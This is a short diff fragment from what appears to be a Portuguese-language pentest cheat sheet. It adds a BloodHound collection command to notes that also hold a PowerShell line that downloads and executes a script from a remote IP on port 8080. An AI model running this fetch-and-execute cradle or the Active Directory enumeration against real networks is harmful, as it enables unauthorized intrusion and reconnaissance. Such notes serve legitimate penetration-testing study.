@@ -189,6 +189,7 @@ IEX (New-Object System.Net.WebClient).DownloadString("http://175.12.80.10:8080/S
 Invoke-BloodHound 
 ```
 ```
+INvoke-Bloodhound -Collectionmethod All
 Invoke-BloodHound -CollectionMethod ACL,ObjectProps
 -CompressData -RemoveCSV and -NoSaveCache   --GERAR O ARQUIVO ZIP PARA ARRASRTAR NO BLOODHOUND
 ```
